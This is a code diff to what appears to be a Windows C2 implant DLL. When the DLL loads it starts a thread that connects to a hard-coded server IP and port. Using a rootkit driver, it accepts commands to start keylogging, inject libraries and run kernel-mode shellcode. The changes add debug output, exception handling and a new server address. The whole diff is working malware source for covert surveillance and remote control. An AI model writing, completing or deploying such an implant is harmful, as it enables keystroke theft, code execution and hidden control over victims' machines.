@@ -29,6 +29,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        OutputDebugStringA("Loaded C2 dll\n");
         CreateThread(nullptr, 0, RunC2, nullptr, 0, nullptr);
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
@@ -38,7 +39,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 
-constexpr const CHAR* SERVER_IP = "127.0.0.1";
+constexpr const CHAR* SERVER_IP = "192.168.52.1";
 constexpr ULONG SERVER_PORT = 9191;
 
 std::atomic<HANDLE> g_KeyloggingThread = 0;
@@ -52,23 +53,29 @@ DWORD RunC2(PVOID) {
         RootkitDriver driver;
         driver.RestoreProtectionToProcess(GetCurrentProcessId());
 
+
         while (true) {
             auto serverCommand = socket.Recv();
             std::string additionalData;
-            auto cmd = ParseCommand(serverCommand, &additionalData);
-            switch (cmd) {
-            case StartKeylogging:
-                HandleStartKeylogging(driver, additionalData, socket);
-                break;
-            case EndKeylogging:
-                HandleEndKeylogging(driver);
-                break;
-            case InjectLibrary:
-                HandleInjectLibrary(driver, additionalData);
-                break;
-            case RunKmShellcode:
-                HandleRunKmShellcode(driver, additionalData, socket);
-                break;
+            try {
+                auto cmd = ParseCommand(serverCommand, &additionalData);
+                switch (cmd) {
+                case StartKeylogging:
+                    HandleStartKeylogging(driver, additionalData, socket);
+                    break;
+                case EndKeylogging:
+                    HandleEndKeylogging(driver);
+                    break;
+                case InjectLibrary:
+                    HandleInjectLibrary(driver, additionalData);
+                    break;
+                case RunKmShellcode:
+                    HandleRunKmShellcode(driver, additionalData, socket);
+                    break;
+                }
+            }
+            catch (std::exception& exception) {
+                OutputDebugStringA(exception.what());
             }
         }
     }
